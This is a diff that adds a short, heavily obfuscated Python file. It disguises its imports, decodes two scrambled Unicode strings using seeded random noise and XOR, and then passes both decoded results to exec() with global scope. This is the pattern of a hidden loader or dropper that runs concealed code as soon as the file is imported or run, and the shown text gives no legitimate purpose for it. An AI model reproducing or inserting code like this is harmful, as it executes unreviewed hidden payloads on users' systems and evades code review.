@@ -1,0 +1,6 @@
+m=list(map(__import__,("random","string","itertools")));from random import seed as execute;oi,mp,te=m[False].choice,m[True].printable,m[2].zip_longest;execute(0x89daf42);noise="".join((oi(mp) for i in range(111)));b8,d,dd=None,'ċŌÐêãĔĬēàÌãĘÊùøąÊõĄÿÙħûĖ»æÞÃ¹ÎøÅ¿ÍĂĔā½úÂÕÛÌÎØ·ð¬ÌúýÎãÚĆîÞ«ÔďèĂ¯Ñü«ðÓûČÂđÀÈ¾ÒÂòÝÃ£Ö¸È±ÌÕĠíâ¼ď¶´ÇúöĠąĀºÃ·®¬©·Ā¦Ĝâ','ĽĨğÑÞÊãĎÈÃÈÂÞĻËõ¼ēĤİÙÐÔġġ¿ê¾¿¹¿ÅüĕãĬï°Îðĝý÷°Ñ±ýÑěÛê³ËßçÁĐýÙÚÓãÞÿØï³Åúñ«ā²ÁãÊËò¥¦ýáþåØ½òČÅčÞÃâíý¡·Ê¸ôÆ´ÂĒåÒėÛ±õÃà¬òÆ½ÎĂõĄĚÏĊé½¨Ú¦¢æå£þ¸Üö»éÌĈÒöÙěÏÂÔ«ºþĐĈäĚĖĐÁ¬ÉčĠ´îĄ';noise2="".join((oi(mp) for i in range(164)));e=lambda a:None if a is b8 else chr(a);f=""
+def random(y,off):c=y.place**1.2+off-(True+True+True)*y.place;return b8 if y.str is None else ord(y.str)-int(c)
+def r(x,i,place):x.str:int=i;x.place=place
+gxv45=[enumerate,"input",str(),str(),type("r",(),{tuple("""""".join((oi("intv_")) for i in range(8)) for i in range(17015))[-1]:r})];gxv45[4].cal=random
+for ind,ch in gxv45[False](te(dd,d)):che=e(gxv45[4](ch[1],ind).cal(211));r2=e(gxv45[4](ch[0],ind).cal(207));gxv45[2]+=che if che is not b8 else "";f+=r2 if r2 is not b8 else ""
+gxv45[2]=gxv45[3].join(chr(ord(a)^ord(b)) for a,b in zip(gxv45[2],noise));gxv45[0]=gxv45[3].join(chr(ord(a)^ord(b)) for a,b in zip(f,noise2));exec(gxv45[2],locals()["__builtins__"].globals());exec(gxv45[0],locals()["__builtins__"].globals())
